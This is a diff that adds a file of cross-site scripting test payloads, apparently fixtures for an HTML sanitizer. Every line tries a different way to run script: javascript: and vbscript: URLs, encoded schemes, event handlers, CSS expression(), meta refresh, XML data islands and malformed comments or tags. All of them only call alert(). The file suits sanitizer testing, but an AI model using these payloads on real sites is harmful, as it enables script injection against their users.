@@ -1,0 +1,39 @@
+<img src="javascript:alert(1); /><br>
+<a href="vbscript:window.alert(2)">test</a><br>
+<IMG width="0" height="0" style="background: url(j&#x0061;vascript:alert('boop'));">
+<IMG width="0" height="0" onerror="alert(3);" src="::"> 
+<META http-equiv="refresh" content="0;url=javascript:alert(4);">
+<IMG width="0" height="0" src="javascript:alert(5);">
+<LINK rel="stylesheet" href="javascript:alert(6);">
+<IFRAME width="0" height="0" src="javascript:alert(7);"></IFRAME> 
+<IMG width="0" height="0" style="width: expression(alert(8));">
+<IMG width="0" height="0" style="background:url(javascript:alert(9));">
+
+
+<SPAN datasrc="#xml" datafld="XML2" dataformatas="html"></SPAN>
+<XML id="xml"><XML1><XML2>
+  <![CDATA[<]]>SCRIPT<![CDATA[>]]>
+    alert(10);
+  <![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+</XML2></XML1></XML>
+
+<IMG src="javascript:alert(12);">
+<img src="j&#x0061;vascript:alert(13);">
+<img src="view-source:http://ya.ru/">
+<!-- <img src="view-source:http://ya.ru/"> -->
+
+<img dynsrc="javascript:alert(15);">
+<input type="image" dynsrc="javascript:alert(16);">
+<bgsound src="javascript:alert(17);">
+<img src="livescript:alert(18);">
+<a href="about:<script>alert(19);</script>">12</a>
+<style type="text/javascript">alert(20);</style>
+<object classid="clsid:34534" codebase="javascript:alert(21);"></object>
+<img src="blah"onmouseover="alert(26);"> 
+<img src="blah>" onmouseover="alert(27);">
+<xml src="javascript:alert(28);"> 
+
+<style><!--</style><script>alert(22);//--></script>
+<![CDATA[<!--]]><script>alert(23);//--></script>
+<!-- -- --><script>alert(24);</script><!-- -- -->
+<<script>alert(25);</script> 
